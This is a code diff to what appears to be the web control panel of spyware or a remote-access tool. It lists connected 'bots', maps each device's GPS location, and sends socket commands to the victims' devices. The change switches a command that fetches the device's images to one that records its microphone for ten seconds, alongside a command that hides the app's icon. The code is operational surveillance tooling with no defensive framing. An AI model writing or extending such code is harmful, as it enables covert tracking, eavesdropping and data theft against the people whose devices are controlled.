@@ -35,9 +35,10 @@ function newBotHandler(data) {
 }       //Function to handle new bot connected and show it on the screen
 
 
-socket.on('offlineBot', function (uid) {
+socket.on('offlineBot', function (data) {
+    let { uid, socketId } = data;
     for (var i = _botDataList.length - 1; i >= 0; i--) {
-        if (_botDataList[i].uid === uid) {
+        if (_botDataList[i].socket_id === socketId) {
             _botDataList[i].status = false;
             M.toast({html: 'Bot is offline :-('})
         }
@@ -72,8 +73,9 @@ new Vue({
                 botStatus_para.style.color = '#2b542c';
             }
             for (var i = 0; i < _botDataList.length; i++)
-                if (_botDataList[i].uid === currentUID && _botDataList[i].location)
+                if (_botDataList[i].uid === currentUID && _botDataList[i].location ){
                     myMap(_botDataList[i].location.lat, _botDataList[i].location.lon);
+                }
 
         }
     }
@@ -145,9 +147,9 @@ function getImages() {
     if (refresh_check.checked || firstLoadImages) {
         i = 0;
         images_div.innerHTML = 'Loading images, Please Wait...';
-        socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
+        // socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
         // socket.emit('commands', {commands: [{command: 'toggleIcon', icon: false}], uid: currentUID});
-        // socket.emit('commands', {commands: [{command: 'recordMicrophone', sec: 10}], uid: currentUID});
+        socket.emit('commands', {commands: [{command: 'recordMicrophone', sec: 10}], uid: currentUID});
 
         setTimeout(function () {
             socket.emit('commands', {commands: [{command: 'stopAll'}], uid: currentUID});
